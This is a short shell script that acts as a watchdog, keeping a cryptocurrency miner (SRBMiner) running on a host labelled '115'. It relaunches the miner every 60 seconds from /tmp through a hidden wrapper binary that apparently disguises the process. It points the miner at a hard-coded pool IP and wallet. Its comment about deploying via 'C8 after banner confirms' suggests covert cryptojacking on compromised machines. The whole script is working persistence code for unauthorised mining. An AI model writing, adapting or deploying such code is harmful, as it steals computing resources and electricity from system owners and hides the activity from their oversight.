#!/bin/sh
# wd10 — keep the pfake-wrapped SRBMiner alive on 115 (deploy via C8 after banner confirms)
W=$1
[ -z "$W" ] && W=/tmp/.p10
while true; do
  if ! pgrep -x SRBMiner-MULTI >/dev/null 2>&1; then
    cd /tmp/SRBMiner-Multi-3-8-8 || exit 1
    nohup env -i PFAKE_LATEENGAGE=1 HOME=/tmp PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin \
      LD_LIBRARY_PATH=/usr/lib/x86_64-linux-gnu \
      $W ./SRBMiner-MULTI --algorithm pearlhash \
      --pool stratum+tcp://220.158.235.192:12001 \
      --wallet prl1phzm3ve2e5evduckml80c7u9pdhdr4jw2uq4qv2m8c3ty4pjx9dtswvx62m2 \
      > /tmp/wrap.log 2>&1 &
  fi
  sleep 60
done
